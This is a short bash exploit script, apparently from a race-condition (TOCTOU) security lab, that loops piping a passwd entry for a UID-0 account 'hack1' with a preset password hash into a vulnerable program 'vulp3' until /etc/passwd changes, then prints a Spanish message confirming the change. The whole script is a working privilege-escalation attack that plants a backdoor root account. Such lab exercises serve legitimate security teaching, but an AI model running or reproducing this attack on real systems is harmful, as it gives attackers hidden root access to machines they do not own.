#!/bin/bash

CHECKFILE="ls -l /etc/passwd"

old=$($CHECKFILE)
new=$($CHECKFILE)

while [ "$old" = "$new" ]
do
    echo "hack1:U6aMy0wojraho:0:0:hack:/root:/bin/bash" | sudo ./vulp3
    new=$($CHECKFILE)
    sudo ls -la /tmp/XYZ
done
echo "El archivo passwd ha cambiado"
